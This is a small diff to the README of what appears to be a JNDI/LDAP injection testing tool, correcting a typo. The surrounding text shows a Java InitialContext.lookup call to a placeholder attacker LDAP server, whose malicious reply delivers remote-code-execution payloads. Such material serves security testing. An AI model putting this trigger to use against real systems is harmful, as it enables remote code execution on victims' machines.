@@ -7,7 +7,7 @@ In order to perform an attack, you can start these servers localy and then trigg
 ```java
 InitialContext.lookup("ldap://your_server.com:1389/o=reference");
 ```
-It will initiate a connection from the vulnerable clinet to the local LDAP server. 
+It will initiate a connection from the vulnerable client to the local LDAP server. 
 Then, the local server responds with a malicious entry containing one of the payloads, that can be useful to achieve a Remote Code Execution. 
 
 ### Motivation
